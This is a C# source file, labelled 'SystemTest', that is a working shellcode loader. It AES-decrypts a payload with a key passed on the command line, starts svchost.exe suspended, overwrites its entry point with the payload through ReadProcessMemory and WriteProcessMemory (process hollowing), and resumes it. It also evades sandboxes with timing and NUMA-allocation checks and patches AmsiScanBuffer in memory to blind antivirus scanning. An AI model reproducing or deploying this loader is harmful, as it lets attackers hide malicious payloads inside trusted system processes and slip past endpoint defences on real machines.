using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;


namespace SystemTest
{
    public class Program
    {
        internal const uint CREATE_SUSPENDED = 0x4;
        internal const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        internal struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        internal struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        
        public static void Main(string[] args)
        {
            if (args.Length < 1) {
                goto Fail;
            }

            if (args[0].Length != 32) {
                goto Fail;
            }

            // av evsion and amsi patch
            if (setup() == false) {
                goto Fail;
            }

            string p = "@@@";
            string k = args[0];
            byte[] buf = transformString(k, p);

            //byte f1 = 0x5c;
            //byte[] fdata = { 0x63, 0x3a, f1, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, f1, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, f1, 0x73, 0x76, 0x63, 0x68, 0x6f, 0x73, 0x74, 0x2e, 0x65, 0x78, 0x65, 0x00};
            //string fn = Encoding.ASCII.GetString(fdata);
            //Console.WriteLine(fn);

            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool result = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            if (result == false) {
                goto Fail;
            }
            
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            if (qResult != 0) {
                goto Fail;
            }
            
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            if (result == false) {
                goto Fail;
            }
            
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            if (result == false) {
                goto Fail;
            }
            
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            if (result == false) {
                goto Fail;
            }
            
            uint rResult = ResumeThread(pInfo.hThread);
            if (rResult != 1) {
                goto Fail;
            }
            Console.WriteLine("test succeeded");
            return;

        Fail:
            Console.WriteLine("test failed");
        }

        private static byte[] transformString(string k, string s)
        {
            byte[] tk = Encoding.ASCII.GetBytes(k);
            tk = SHA256.Create().ComputeHash(tk);

            byte[] data = Convert.FromBase64String(s);

            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tk, subArray(tk, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {
                    csDecrypt.Write(data, 0, data.Length);
                    return msDecrypt.ToArray();
                }
            }
        }

        private static byte[] subArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }

        private static bool setup()
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, CREATE_SUSPENDED, 0) == IntPtr.Zero) {
                return false;
            }

            var r = new Random();
            uint s = (uint)r.Next(6000, 14000);
            double d = s / 1000 - 0.5;
            DateTime b = DateTime.Now;
            Sleep(s);
            if (DateTime.Now.Subtract(b).TotalSeconds < d) {
                return false;
            }

            update();
            return true;
        }
        
        private static void update()
        {
            byte[] d1 = { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c, 0x00 }; // amsi.dll
            byte[] d2 = { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x00 }; // AmsiScanBuffer
            
            IntPtr addr = GetProcAddress(LoadLibrary(Encoding.ASCII.GetString(d1)), Encoding.ASCII.GetString(d2));
            VirtualProtect(addr, (UIntPtr)5, 0x40, out uint old);

            Byte[] patch = { 0x31, 0xff, 0x90 };
            Marshal.Copy(patch, 0, addr+0x001b, 3);
            
            //Byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            //Marshal.Copy(patch, 0, addr, 6);

            VirtualProtect(addr, (UIntPtr)5, old, out uint _);
            //Console.WriteLine("patch applied");
        }

    }
}